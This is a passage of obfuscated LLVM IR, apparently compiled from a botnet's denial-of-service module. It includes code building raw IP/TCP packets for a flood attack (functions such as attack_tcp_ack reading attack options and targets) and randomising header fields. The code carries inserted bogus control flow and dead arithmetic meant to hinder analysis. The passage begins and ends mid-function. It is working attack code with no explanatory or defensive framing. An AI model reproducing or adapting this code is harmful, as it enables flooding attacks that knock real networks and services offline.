  %763 = call i32 @attack_get_opt_int(i8 zeroext %761, %struct.attack_option* %762, i8 zeroext 15, i32 0)
  %764 = trunc i32 %763 to i8
  store i8 %764, i8* %697, align 1
  %765 = load i8, i8* %679, align 1
  %766 = load %struct.attack_option*, %struct.attack_option** %680, align 8
  %767 = load i32, i32* @LOCAL_ADDR, align 4
  %768 = call i32 @attack_get_opt_ip(i8 zeroext %765, %struct.attack_option* %766, i8 zeroext 24, i32 %767)
  store i32 %768, i32* %698, align 4
  %769 = call i64 @time(i64* null) #6
  %770 = load i32, i32* %676, align 4
  %771 = sext i32 %770 to i64
  %_ = shl i64 %769, %771
  %_1 = sub i64 %769, %771
  %gen = mul i64 %_1, %771
  %_2 = sub i64 0, %769
  %gen3 = add i64 %_2, %771
  %772 = add nsw i64 %769, %771
  %773 = trunc i64 %772 to i32
  store i32 %773, i32* %699, align 4
  %774 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %774, i32* %682, align 4
  %775 = icmp eq i32 %774, -1
  br label %originalBB

originalBB4alteredBB:                             ; preds = %originalBB4, %131
  store i32 0, i32* %19, align 4
  br label %originalBB4

originalBB8alteredBB:                             ; preds = %originalBB8, %153
  %776 = call noalias i8* @calloc(i64 128, i64 1) #6
  %777 = load i8**, i8*** %21, align 8
  %778 = load i32, i32* %19, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds i8*, i8** %777, i64 %779
  store i8* %776, i8** %780, align 8
  %781 = load i8**, i8*** %21, align 8
  %782 = load i32, i32* %19, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds i8*, i8** %781, i64 %783
  %785 = load i8*, i8** %784, align 8
  %786 = bitcast i8* %785 to %struct.iphdr*
  store %struct.iphdr* %786, %struct.iphdr** %38, align 8
  %787 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %788 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %787, i64 1
  %789 = bitcast %struct.iphdr* %788 to %struct.tcphdr*
  store %struct.tcphdr* %789, %struct.tcphdr** %39, align 8
  %790 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %791 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %790, i64 1
  %792 = bitcast %struct.tcphdr* %791 to i8*
  store i8* %792, i8** %40, align 8
  %793 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %794 = bitcast %struct.iphdr* %793 to i8*
  %795 = load i8, i8* %794, align 4
  %_9 = shl i8 %795, 15
  %_10 = sub i8 %795, 15
  %gen11 = mul i8 %_10, 15
  %_12 = sub i8 0, %795
  %gen13 = add i8 %_12, 15
  %_14 = sub i8 0, %795
  %gen15 = add i8 %_14, 15
  %_16 = shl i8 %795, 15
  %_17 = sub i8 %795, 15
  %gen18 = mul i8 %_17, 15
  %_19 = sub i8 0, %795
  %gen20 = add i8 %_19, 15
  %_21 = sub i8 0, %795
  %gen22 = add i8 %_21, 15
  %796 = and i8 %795, 15
  %_23 = sub i8 %796, 64
  %gen24 = mul i8 %_23, 64
  %_25 = shl i8 %796, 64
  %_26 = sub i8 %796, 64
  %gen27 = mul i8 %_26, 64
  %797 = or i8 %796, 64
  store i8 %797, i8* %794, align 4
  %798 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %799 = bitcast %struct.iphdr* %798 to i8*
  %800 = load i8, i8* %799, align 4
  %_28 = shl i8 %800, -16
  %_29 = sub i8 %800, -16
  %gen30 = mul i8 %_29, -16
  %_31 = shl i8 %800, -16
  %_32 = shl i8 %800, -16
  %801 = and i8 %800, -16
  %_33 = sub i8 0, %801
  %gen34 = add i8 %_33, 5
  %_35 = shl i8 %801, 5
  %_36 = sub i8 %801, 5
  %gen37 = mul i8 %_36, 5
  %_38 = shl i8 %801, 5
  %_39 = shl i8 %801, 5
  %_40 = sub i8 0, %801
  %gen41 = add i8 %_40, 5
  %_42 = sub i8 0, %801
  %gen43 = add i8 %_42, 5
  %_44 = sub i8 %801, 5
  %gen45 = mul i8 %_44, 5
  %802 = or i8 %801, 5
  store i8 %802, i8* %799, align 4
  %803 = load i8, i8* %22, align 1
  %804 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %805 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %804, i32 0, i32 1
  store i8 %803, i8* %805, align 1
  %806 = call zeroext i16 @htons(i16 zeroext 60) #7
  %807 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %808 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %807, i32 0, i32 2
  store i16 %806, i16* %808, align 2
  %809 = load i16, i16* %23, align 2
  %810 = call zeroext i16 @htons(i16 zeroext %809) #7
  %811 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %812 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %811, i32 0, i32 3
  store i16 %810, i16* %812, align 4
  %813 = load i8, i8* %24, align 1
  %814 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %815 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %814, i32 0, i32 5
  store i8 %813, i8* %815, align 4
  %816 = load i8, i8* %25, align 1
  %817 = icmp ne i8 %816, 0
  br label %originalBB8

originalBB49alteredBB:                            ; preds = %originalBB49, %216
  %818 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %819 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %818, i32 0, i32 6
  store i8 6, i8* %819, align 1
  %820 = load i32, i32* %36, align 4
  %821 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %822 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %821, i32 0, i32 8
  store i32 %820, i32* %822, align 4
  %823 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %824 = load i32, i32* %19, align 4
  %825 = sext i32 %824 to i64
  %826 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %823, i64 %825
  %827 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %826, i32 0, i32 1
  %828 = load i32, i32* %827, align 4
  %829 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %830 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %829, i32 0, i32 9
  store i32 %828, i32* %830, align 4
  %831 = load i16, i16* %26, align 2
  %832 = call zeroext i16 @htons(i16 zeroext %831) #7
  %833 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %834 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %833, i32 0, i32 0
  store i16 %832, i16* %834, align 4
  %835 = load i16, i16* %27, align 2
  %836 = call zeroext i16 @htons(i16 zeroext %835) #7
  %837 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %838 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %837, i32 0, i32 1
  store i16 %836, i16* %838, align 2
  %839 = load i32, i32* %28, align 4
  %840 = trunc i32 %839 to i16
  %841 = call zeroext i16 @htons(i16 zeroext %840) #7
  %842 = zext i16 %841 to i32
  %843 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %844 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %843, i32 0, i32 2
  store i32 %842, i32* %844, align 4
  %845 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %846 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %845, i32 0, i32 4
  %847 = load i16, i16* %846, align 4
  %_50 = sub i16 0, %847
  %gen51 = add i16 %_50, -241
  %_52 = sub i16 0, %847
  %gen53 = add i16 %_52, -241
  %_54 = sub i16 0, %847
  %gen55 = add i16 %_54, -241
  %_56 = shl i16 %847, -241
  %_57 = sub i16 0, %847
  %gen58 = add i16 %_57, -241
  %_59 = shl i16 %847, -241
  %848 = and i16 %847, -241
  %_60 = sub i16 %848, 160
  %gen61 = mul i16 %_60, 160
  %_62 = sub i16 0, %848
  %gen63 = add i16 %_62, 160
  %_64 = sub i16 %848, 160
  %gen65 = mul i16 %_64, 160
  %_66 = sub i16 0, %848
  %gen67 = add i16 %_66, 160
  %_68 = shl i16 %848, 160
  %_69 = sub i16 %848, 160
  %gen70 = mul i16 %_69, 160
  %849 = or i16 %848, 160
  store i16 %849, i16* %846, align 4
  %850 = load i8, i8* %30, align 1
  %851 = sext i8 %850 to i16
  %852 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %853 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %852, i32 0, i32 4
  %854 = load i16, i16* %853, align 4
  %_71 = sub i16 0, %851
  %gen72 = add i16 %_71, 1
  %_73 = shl i16 %851, 1
  %_74 = sub i16 0, %851
  %gen75 = add i16 %_74, 1
  %855 = and i16 %851, 1
  %_76 = shl i16 %855, 13
  %_77 = shl i16 %855, 13
  %_78 = sub i16 %855, 13
  %gen79 = mul i16 %_78, 13
  %856 = shl i16 %855, 13
  %_80 = sub i16 0, %854
  %gen81 = add i16 %_80, -8193
  %_82 = sub i16 0, %854
  %gen83 = add i16 %_82, -8193
  %_84 = sub i16 0, %854
  %gen85 = add i16 %_84, -8193
  %_86 = sub i16 %854, -8193
  %gen87 = mul i16 %_86, -8193
  %857 = and i16 %854, -8193
  %_88 = sub i16 %857, %856
  %gen89 = mul i16 %_88, %856
  %_90 = sub i16 %857, %856
  %gen91 = mul i16 %_90, %856
  %_92 = shl i16 %857, %856
  %858 = or i16 %857, %856
  store i16 %858, i16* %853, align 4
  %859 = load i8, i8* %31, align 1
  %860 = sext i8 %859 to i16
  %861 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %862 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %861, i32 0, i32 4
  %863 = load i16, i16* %862, align 4
  %_93 = sub i16 %860, 1
  %gen94 = mul i16 %_93, 1
  %_95 = shl i16 %860, 1
  %_96 = sub i16 0, %860
  %gen97 = add i16 %_96, 1
  %_98 = sub i16 %860, 1
  %gen99 = mul i16 %_98, 1
  %864 = and i16 %860, 1
  %_100 = sub i16 %864, 12
  %gen101 = mul i16 %_100, 12
  %_102 = sub i16 %864, 12
  %gen103 = mul i16 %_102, 12
  %_104 = sub i16 0, %864
  %gen105 = add i16 %_104, 12
  %_106 = sub i16 0, %864
  %gen107 = add i16 %_106, 12
  %865 = shl i16 %864, 12
  %_108 = sub i16 %863, -4097
  %gen109 = mul i16 %_108, -4097
  %_110 = shl i16 %863, -4097
  %_111 = sub i16 0, %863
  %gen112 = add i16 %_111, -4097
  %_113 = sub i16 0, %863
  %gen114 = add i16 %_113, -4097
  %_115 = shl i16 %863, -4097
  %866 = and i16 %863, -4097
  %_116 = shl i16 %866, %865
  %_117 = sub i16 0, %866
  %gen118 = add i16 %_117, %865
  %_119 = sub i16 0, %866
  %gen120 = add i16 %_119, %865
  %_121 = sub i16 %866, %865
  %gen122 = mul i16 %_121, %865
  %867 = or i16 %866, %865
  store i16 %867, i16* %862, align 4
  %868 = load i8, i8* %32, align 1
  %869 = sext i8 %868 to i16
  %870 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %871 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %870, i32 0, i32 4
  %872 = load i16, i16* %871, align 4
  %_123 = shl i16 %869, 1
  %_124 = shl i16 %869, 1
  %_125 = sub i16 %869, 1
  %gen126 = mul i16 %_125, 1
  %_127 = sub i16 %869, 1
  %gen128 = mul i16 %_127, 1
  %873 = and i16 %869, 1
  %_129 = shl i16 %873, 11
  %_130 = shl i16 %873, 11
  %_131 = sub i16 %873, 11
  %gen132 = mul i16 %_131, 11
  %_133 = shl i16 %873, 11
  %_134 = sub i16 0, %873
  %gen135 = add i16 %_134, 11
  %874 = shl i16 %873, 11
  %_136 = shl i16 %872, -2049
  %_137 = sub i16 0, %872
  %gen138 = add i16 %_137, -2049
  %_139 = sub i16 %872, -2049
  %gen140 = mul i16 %_139, -2049
  %_141 = sub i16 0, %872
  %gen142 = add i16 %_141, -2049
  %_143 = shl i16 %872, -2049
  %875 = and i16 %872, -2049
  %_144 = sub i16 0, %875
  %gen145 = add i16 %_144, %874
  %_146 = shl i16 %875, %874
  %_147 = sub i16 0, %875
  %gen148 = add i16 %_147, %874
  %_149 = shl i16 %875, %874
  %_150 = sub i16 0, %875
  %gen151 = add i16 %_150, %874
  %_152 = sub i16 0, %875
  %gen153 = add i16 %_152, %874
  %_154 = sub i16 0, %875
  %gen155 = add i16 %_154, %874
  %876 = or i16 %875, %874
  store i16 %876, i16* %871, align 4
  %877 = load i8, i8* %33, align 1
  %878 = sext i8 %877 to i16
  %879 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %880 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %879, i32 0, i32 4
  %881 = load i16, i16* %880, align 4
  %_156 = sub i16 %878, 1
  %gen157 = mul i16 %_156, 1
  %882 = and i16 %878, 1
  %_158 = shl i16 %882, 10
  %_159 = sub i16 0, %882
  %gen160 = add i16 %_159, 10
  %_161 = shl i16 %882, 10
  %883 = shl i16 %882, 10
  %_162 = sub i16 0, %881
  %gen163 = add i16 %_162, -1025
  %_164 = sub i16 %881, -1025
  %gen165 = mul i16 %_164, -1025
  %_166 = sub i16 %881, -1025
  %gen167 = mul i16 %_166, -1025
  %_168 = shl i16 %881, -1025
  %_169 = shl i16 %881, -1025
  %_170 = shl i16 %881, -1025
  %_171 = sub i16 %881, -1025
  %gen172 = mul i16 %_171, -1025
  %884 = and i16 %881, -1025
  %_173 = sub i16 0, %884
  %gen174 = add i16 %_173, %883
  %_175 = shl i16 %884, %883
  %_176 = shl i16 %884, %883
  %_177 = sub i16 %884, %883
  %gen178 = mul i16 %_177, %883
  %_179 = sub i16 %884, %883
  %gen180 = mul i16 %_179, %883
  %_181 = shl i16 %884, %883
  %_182 = sub i16 %884, %883
  %gen183 = mul i16 %_182, %883
  %885 = or i16 %884, %883
  store i16 %885, i16* %880, align 4
  %886 = load i8, i8* %34, align 1
  %887 = sext i8 %886 to i16
  %888 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %889 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %888, i32 0, i32 4
  %890 = load i16, i16* %889, align 4
  %_184 = sub i16 %887, 1
  %gen185 = mul i16 %_184, 1
  %_186 = sub i16 0, %887
  %gen187 = add i16 %_186, 1
  %_188 = shl i16 %887, 1
  %_189 = sub i16 0, %887
  %gen190 = add i16 %_189, 1
  %_191 = sub i16 0, %887
  %gen192 = add i16 %_191, 1
  %_193 = sub i16 0, %887
  %gen194 = add i16 %_193, 1
  %891 = and i16 %887, 1
  %_195 = sub i16 0, %891
  %gen196 = add i16 %_195, 9
  %_197 = shl i16 %891, 9
  %_198 = shl i16 %891, 9
  %_199 = sub i16 0, %891
  %gen200 = add i16 %_199, 9
  %_201 = sub i16 0, %891
  %gen202 = add i16 %_201, 9
  %_203 = sub i16 %891, 9
  %gen204 = mul i16 %_203, 9
  %_205 = shl i16 %891, 9
  %892 = shl i16 %891, 9
  %_206 = shl i16 %890, -513
  %_207 = sub i16 0, %890
  %gen208 = add i16 %_207, -513
  %893 = and i16 %890, -513
  %_209 = shl i16 %893, %892
  %_210 = shl i16 %893, %892
  %_211 = shl i16 %893, %892
  %_212 = sub i16 0, %893
  %gen213 = add i16 %_212, %892
  %894 = or i16 %893, %892
  store i16 %894, i16* %889, align 4
  %895 = load i8, i8* %35, align 1
  %896 = sext i8 %895 to i16
  %897 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %898 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %897, i32 0, i32 4
  %899 = load i16, i16* %898, align 4
  %_214 = shl i16 %896, 1
  %_215 = sub i16 0, %896
  %gen216 = add i16 %_215, 1
  %_217 = sub i16 0, %896
  %gen218 = add i16 %_217, 1
  %_219 = sub i16 0, %896
  %gen220 = add i16 %_219, 1
  %_221 = sub i16 0, %896
  %gen222 = add i16 %_221, 1
  %_223 = sub i16 0, %896
  %gen224 = add i16 %_223, 1
  %_225 = shl i16 %896, 1
  %_226 = shl i16 %896, 1
  %900 = and i16 %896, 1
  %_227 = sub i16 0, %900
  %gen228 = add i16 %_227, 8
  %_229 = sub i16 %900, 8
  %gen230 = mul i16 %_229, 8
  %901 = shl i16 %900, 8
  %_231 = shl i16 %899, -257
  %_232 = shl i16 %899, -257
  %_233 = sub i16 0, %899
  %gen234 = add i16 %_233, -257
  %_235 = sub i16 %899, -257
  %gen236 = mul i16 %_235, -257
  %_237 = shl i16 %899, -257
  %_238 = shl i16 %899, -257
  %902 = and i16 %899, -257
  %_239 = sub i16 %902, %901
  %gen240 = mul i16 %_239, %901
  %_241 = sub i16 0, %902
  %gen242 = add i16 %_241, %901
  %_243 = shl i16 %902, %901
  %903 = or i16 %902, %901
  store i16 %903, i16* %898, align 4
  %904 = load i8*, i8** %40, align 8
  %905 = getelementptr inbounds i8, i8* %904, i32 1
  store i8* %905, i8** %40, align 8
  store i8 2, i8* %904, align 1
  %906 = load i8*, i8** %40, align 8
  %907 = getelementptr inbounds i8, i8* %906, i32 1
  store i8* %907, i8** %40, align 8
  store i8 4, i8* %906, align 1
  %908 = call i32 @rand_next()
  %_244 = sub i32 %908, 15
  %gen245 = mul i32 %_244, 15
  %_246 = sub i32 0, %908
  %gen247 = add i32 %_246, 15
  %_248 = sub i32 0, %908
  %gen249 = add i32 %_248, 15
  %_250 = sub i32 %908, 15
  %gen251 = mul i32 %_250, 15
  %909 = and i32 %908, 15
  %_252 = shl i32 1400, %909
  %_253 = sub i32 0, 1400
  %gen254 = add i32 %_253, %909
  %_255 = shl i32 1400, %909
  %_256 = sub i32 1400, %909
  %gen257 = mul i32 %_256, %909
  %_258 = sub i32 0, 1400
  %gen259 = add i32 %_258, %909
  %910 = add i32 1400, %909
  %911 = trunc i32 %910 to i16
  %912 = call zeroext i16 @htons(i16 zeroext %911) #7
  %913 = load i8*, i8** %40, align 8
  %914 = bitcast i8* %913 to i16*
  store i16 %912, i16* %914, align 2
  %915 = load i8*, i8** %40, align 8
  %916 = getelementptr inbounds i8, i8* %915, i64 2
  store i8* %916, i8** %40, align 8
  %917 = load i8*, i8** %40, align 8
  %918 = getelementptr inbounds i8, i8* %917, i32 1
  store i8* %918, i8** %40, align 8
  store i8 4, i8* %917, align 1
  %919 = load i8*, i8** %40, align 8
  %920 = getelementptr inbounds i8, i8* %919, i32 1
  store i8* %920, i8** %40, align 8
  store i8 2, i8* %919, align 1
  %921 = load i8*, i8** %40, align 8
  %922 = getelementptr inbounds i8, i8* %921, i32 1
  store i8* %922, i8** %40, align 8
  store i8 8, i8* %921, align 1
  %923 = load i8*, i8** %40, align 8
  %924 = getelementptr inbounds i8, i8* %923, i32 1
  store i8* %924, i8** %40, align 8
  store i8 10, i8* %923, align 1
  %925 = call i32 @rand_next()
  %926 = load i8*, i8** %40, align 8
  %927 = bitcast i8* %926 to i32*
  store i32 %925, i32* %927, align 4
  %928 = load i8*, i8** %40, align 8
  %929 = getelementptr inbounds i8, i8* %928, i64 4
  store i8* %929, i8** %40, align 8
  %930 = load i8*, i8** %40, align 8
  %931 = bitcast i8* %930 to i32*
  store i32 0, i32* %931, align 4
  %932 = load i8*, i8** %40, align 8
  %933 = getelementptr inbounds i8, i8* %932, i64 4
  store i8* %933, i8** %40, align 8
  %934 = load i8*, i8** %40, align 8
  %935 = getelementptr inbounds i8, i8* %934, i32 1
  store i8* %935, i8** %40, align 8
  store i8 1, i8* %934, align 1
  %936 = load i8*, i8** %40, align 8
  %937 = getelementptr inbounds i8, i8* %936, i32 1
  store i8* %937, i8** %40, align 8
  store i8 3, i8* %936, align 1
  %938 = load i8*, i8** %40, align 8
  %939 = getelementptr inbounds i8, i8* %938, i32 1
  store i8* %939, i8** %40, align 8
  store i8 3, i8* %938, align 1
  %940 = load i8*, i8** %40, align 8
  %941 = getelementptr inbounds i8, i8* %940, i32 1
  store i8* %941, i8** %40, align 8
  store i8 6, i8* %940, align 1
  br label %originalBB49

originalBB263alteredBB:                           ; preds = %originalBB263, %360
  br label %originalBB263

originalBB267alteredBB:                           ; preds = %originalBB267, %426
  %942 = call i32 @rand_next()
  %943 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %944 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %943, i32 0, i32 8
  store i32 %942, i32* %944, align 4
  br label %originalBB267

originalBB271alteredBB:                           ; preds = %originalBB271, %446
  %945 = load i16, i16* %23, align 2
  %946 = zext i16 %945 to i32
  %947 = icmp eq i32 %946, 65535
  br label %originalBB271

originalBB275alteredBB:                           ; preds = %originalBB275, %466
  %948 = call i32 @rand_next()
  %_276 = sub i32 %948, 65535
  %gen277 = mul i32 %_276, 65535
  %_278 = shl i32 %948, 65535
  %949 = and i32 %948, 65535
  %950 = trunc i32 %949 to i16
  %951 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %952 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %951, i32 0, i32 3
  store i16 %950, i16* %952, align 4
  br label %originalBB275

originalBB282alteredBB:                           ; preds = %originalBB282, %492
  %953 = call i32 @rand_next()
  %_283 = sub i32 %953, 65535
  %gen284 = mul i32 %_283, 65535
  %_285 = sub i32 0, %953
  %gen286 = add i32 %_285, 65535
  %_287 = sub i32 %953, 65535
  %gen288 = mul i32 %_287, 65535
  %_289 = shl i32 %953, 65535
  %954 = and i32 %953, 65535
  %955 = trunc i32 %954 to i16
  %956 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %957 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %956, i32 0, i32 0
  store i16 %955, i16* %957, align 4
  br label %originalBB282

originalBB293alteredBB:                           ; preds = %originalBB293, %518
  %958 = call i32 @rand_next()
  %_294 = sub i32 0, %958
  %gen295 = add i32 %_294, 65535
  %_296 = sub i32 %958, 65535
  %gen297 = mul i32 %_296, 65535
  %_298 = sub i32 %958, 65535
  %gen299 = mul i32 %_298, 65535
  %959 = and i32 %958, 65535
  %960 = trunc i32 %959 to i16
  %961 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %962 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %961, i32 0, i32 1
  store i16 %960, i16* %962, align 2
  br label %originalBB293

originalBB303alteredBB:                           ; preds = %originalBB303, %543
  %963 = call i32 @rand_next()
  %964 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %965 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %964, i32 0, i32 2
  store i32 %963, i32* %965, align 4
  br label %originalBB303

originalBB307alteredBB:                           ; preds = %originalBB307, %573
  %966 = call i32 @rand_next()
  %_308 = shl i32 %966, 65535
  %_309 = shl i32 %966, 65535
  %_310 = shl i32 %966, 65535
  %_311 = shl i32 %966, 65535
  %_312 = sub i32 0, %966
  %gen313 = add i32 %_312, 65535
  %_314 = sub i32 %966, 65535
  %gen315 = mul i32 %_314, 65535
  %_316 = sub i32 0, %966
  %gen317 = add i32 %_316, 65535
  %967 = and i32 %966, 65535
  %968 = trunc i32 %967 to i16
  %969 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %970 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %969, i32 0, i32 7
  store i16 %968, i16* %970, align 2
  br label %originalBB307

originalBB321alteredBB:                           ; preds = %originalBB321, %633
  %971 = load i32, i32* %19, align 4
  %_322 = sub i32 %971, 1
  %gen323 = mul i32 %_322, 1
  %_324 = sub i32 %971, 1
  %gen325 = mul i32 %_324, 1
  %_326 = sub i32 %971, 1
  %gen327 = mul i32 %_326, 1
  %_328 = shl i32 %971, 1
  %_329 = sub i32 0, %971
  %gen330 = add i32 %_329, 1
  %_331 = sub i32 %971, 1
  %gen332 = mul i32 %_331, 1
  %_333 = sub i32 0, %971
  %gen334 = add i32 %_333, 1
  %_335 = shl i32 %971, 1
  %972 = add nsw i32 %971, 1
  store i32 %972, i32* %19, align 4
  br label %originalBB321

originalBB339alteredBB:                           ; preds = %originalBB339, %652
  %973 = call i64 @time(i64* null) #6
  %974 = load i32, i32* %37, align 4
  %975 = sext i32 %974 to i64
  %976 = icmp sgt i64 %973, %975
  br label %originalBB339
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i8, align 1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.tcphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %40 = load i8, i8* %7, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias i8* @calloc(i64 %41, i64 8) #6
  %43 = bitcast i8* %42 to i8**
  store i8** %43, i8*** %13, align 8
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 2, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %14, align 1
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 3, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %15, align 2
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 4, i32 64)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %16, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 5, i32 0)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %17, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 6, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %18, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 7, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %19, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 16, i32 65535)
  store i32 %70, i32* %20, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 17, i32 65535)
  store i32 %73, i32* %21, align 4
  %74 = load i8, i8* %9, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 10, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %22, align 1
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 11, i32 1)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %23, align 1
  %82 = load i8, i8* %9, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 12, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %24, align 1
  %86 = load i8, i8* %9, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 13, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %25, align 1
  %90 = load i8, i8* %9, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 14, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %26, align 1
  %94 = load i8, i8* %9, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %96 = call i32 @attack_get_opt_int(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 15, i32 0)
